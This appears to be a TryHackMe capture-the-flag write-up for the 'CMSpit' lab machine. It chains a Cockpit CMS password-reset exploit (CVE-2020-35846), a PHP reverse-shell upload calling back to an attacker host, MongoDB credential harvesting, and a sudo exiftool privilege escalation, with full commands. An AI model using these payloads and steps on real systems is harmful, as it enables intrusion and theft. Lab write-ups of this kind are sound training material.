# CMSpit Â— TryHackMe Writeup

**Target:** `TARGET_IP` (10.129.180.199 at time of solve)
**OS:** Linux (Ubuntu 16.04)
**Difficulty:** Medium
**Tech stack:** Apache 2.4.18, Cockpit CMS 0.11.1 (PHP), MongoDB
**Exploit chain:** Cockpit user enum + reset (CVE-2020-35846) ? admin login ? PHP upload ? `www-data` shell ? MongoDB enumeration ? `stux:p4ssw0rdhack3d!123` ? `sudo exiftool -filename=` ? root flag in `stux`'s home

---

## Attack Chain Overview

```
nmap ? 22, 80 (Apache 2.4.18)
    ?
curl /package.json ? "version": "0.11.1" (Cockpit CMS, vulnerable)
    ?
ExploitDB 50185 (CVE-2020-35846) ? enumerate users + reset admin password
    ?
Cockpit admin ? upload shell.php in Assets ? /storage/uploads/.../<hash>shell.php
    ?
Reverse shell as www-data ? user.txt
    ?
find / -name "*.sqlite" 2>/dev/null ? cockpit*.sqlite (no creds inside)
    ?
mongo ? use sudousersbak; db.user.find() ? stux : p4ssw0rdhack3d!123
    ?
su stux ? sudo -l ? (root) NOPASSWD: /usr/bin/exiftool *
    ?
sudo exiftool -filename=/home/stux/root.txt /root/root.txt ? root flag
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Cockpit Fingerprint](#2-cockpit-fingerprint)
3. [Initial Access Â— Cockpit Unauth Reset + PHP Upload](#3-initial-access--cockpit-unauth-reset--php-upload)
4. [Post-Exploitation (`www-data`)](#4-post-exploitation-www-data)
5. [User Â— MongoDB Enumeration](#5-user--mongodb-enumeration)
6. [Root Â— `sudo exiftool` Filename Move](#6-root--sudo-exiftool-filename-move)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run an Nmap scan to discover open ports and services.
# Why here: identify the attack surface (Apache and Cockpit CMS).
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,80 $TARGET -oA service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 |
| 80/tcp | Apache 2.4.18 |

See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. Cockpit Fingerprint

```bash
# What it does: send an HTTP request to the target web server.
# Why here: retrieve package.json to fingerprint the Cockpit CMS version for CVE-2020-35846.
curl -s http://$TARGET/package.json | grep version
# "version": "0.11.1"
```

Cockpit CMS = 0.11.1 is vulnerable to **CVE-2020-35846** (unauth user enumeration + password reset via NoSQL operator injection).

```bash
# What it does: search the local Exploit-DB for known vulnerabilities.
# Why here: find an automated exploit for the specific version of Cockpit CMS detected.
searchsploit cockpit cms
# Cockpit CMS 0.11.1 - 'Username' Enumeration / NoSQL Injection (50185)
```

Tools: [curl](../../../tools/web/curl.md), [searchsploit](../../../tools/recon/searchsploit.md).

---

## 3. Initial Access Â— Cockpit Unauth Reset + PHP Upload

Full technique: [cockpit-cms-rce.md](../../../exploits/web-rce/cockpit-cms-rce.md).

### 3a. Enumerate users + reset admin
```bash
# What it does: run the Cockpit CMS exploit script.
# Why here: enumerate valid usernames and reset the admin password to regain control of the CMS.
python3 enumeration.py http://$TARGET
# [+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']
# (interactive prompt ? reset admin's password to NEW_PASS)
```

### 3b. Login + upload `shell.php`
Open `/auth/login`, log in with the new admin password, go to **Assets** and upload:
```php
<?php
system('bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"');
```

The "Direct link" reveals the on-disk path:
```
http://$TARGET/storage/uploads/2026/04/29/69f24f45d48fbshell.php
```

### 3c. Trigger
```bash
# What it does: start a netcat listener.
# Why here: capture the incoming PHP reverse shell from the Cockpit Assets upload.
nc -lvnp 4444
# What it does: trigger the uploaded PHP shell.
# Why here: execute the bash reverse shell payload and land the www-data foothold.
curl http://$TARGET/storage/uploads/2026/04/29/69f24f45d48fbshell.php
# whoami ? www-data
```

Stabilise:
```bash
# What it does: spawn an interactive bash shell using Python.
# Why here: stabilize the raw netcat shell to allow for tab completion and job control.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

## 4. Post-Exploitation (`www-data`)

Standard [Linux enumeration](../../../playbooks/enumeration/linux.md).

```bash
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
# /var/www/html/cockpit/storage/data/cockpitdb.sqlite
# /var/www/html/cockpit/storage/data/cockpit.sqlite
# /var/www/html/cockpit/storage/data/cockpit.memory.sqlite
```

Cockpit's SQLite stores didn't yield reusable creds. runs:

```bash
# What it does: filters text with the specified pattern.
# Why here: extract the important clue from a large output.
ss -tlnp | grep 27017     # mongod listening
pgrep -a mongod
```

---

## 5. User Â— MongoDB Enumeration

Full technique: [mongodb-enumeration.md](../../../techniques/creds/mongodb-enumeration.md).

```bash
# What it does: connect to the MongoDB service.
# Why here: enumerate the 'sudousersbak' database to find the user 'stux' credentials.
mongo
> show dbs
admin     0.000GB
cockpitdb 0.012GB
config    0.000GB
local     0.000GB
sudousersbak 0.000GB           ? unusual name

> use sudousersbak
> show collections
flag
system.indexes
user

> db.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ssw0rdhack3d!123" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
```

`stux : p4ssw0rdhack3d!123`. Use it:
```bash
su stux
# (or) ssh stux@$TARGET
# What it does: display the contents of a file.
# Why here: read flags or configuration files recovered during the exploitation.
cat /home/stux/user.txt
```

Tools: [mongo](../../../tools/database/mongo.md).

---

## 6. Root Â— `sudo exiftool` Filename Move

Full technique: [exiftool-sudo-cve-2021-22204.md](../../../privesc/linux/exiftool-sudo-cve-2021-22204.md).

```bash
# What it does: list sudo privileges for the current user.
# Why here: check for allowed commands (like exiftool) that can lead to privilege escalation.
sudo -l
# (root) NOPASSWD: /usr/bin/exiftool *

# What it does: abuse exiftool's -filename flag under sudo.
# Why here: move the root-owned flag file into a readable location in the stux user's home directory.
sudo exiftool -filename=/home/stux/root.txt /root/root.txt
# What it does: display the contents of a file.
# Why here: read flags or configuration files recovered during the exploitation.
cat /home/stux/root.txt
# <root flag>
```

`-filename=` is exiftool's rename primitive. Used under `sudo`, it can move any root-owned file into a path you control. No CVE needed for this; CVE-2021-22204 is the fallback when sudoers filters that flag.

---

## 7. Key Takeaways

- Always pull `/package.json` / `/composer.json` from any PHP CMS Â— the version string is one curl away from a known-CVE pivot.
- Cockpit CMS = 0.11.1 chain is the canonical NoSQL-injection-into-reset pattern. The same idea applies to any app that forwards JSON straight into Mongo's `findOne()`.
- Cockpit / similar CMSs serve uploads under `/storage/uploads/...` and execute `.php` from there by default. Asset upload + direct-link click = RCE.
- A box with a CMS almost always runs the CMS's own DB on `127.0.0.1`. After landing the `www-data` shell, `find / -name "*.db" -o -name "*.sqlite"` and `ss -tlnp | grep -E '27017|3306|5432|6379'` are mandatory next steps.
- `sudo` rules naming `exiftool`, `vim`, `awk`, `find`, `tar`, `zip`, `git` are GTFOBins-class Â— `sudo -l` is always the start of the privesc check.

---

## Related Notes
- [cockpit-cms-rce.md](../../../exploits/web-rce/cockpit-cms-rce.md) Â— initial access
- [mongodb-enumeration.md](../../../techniques/creds/mongodb-enumeration.md) Â— user pivot
- [exiftool-sudo-cve-2021-22204.md](../../../privesc/linux/exiftool-sudo-cve-2021-22204.md) Â— root privesc
- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) Â— playbook backbone
- [nmap](../../../tools/recon/nmap.md), [curl](../../../tools/web/curl.md), [searchsploit](../../../tools/recon/searchsploit.md), [netcat](../../../tools/pivot/netcat.md), [mongo](../../../tools/database/mongo.md), [exiftool](../../../tools/web/exiftool.md)
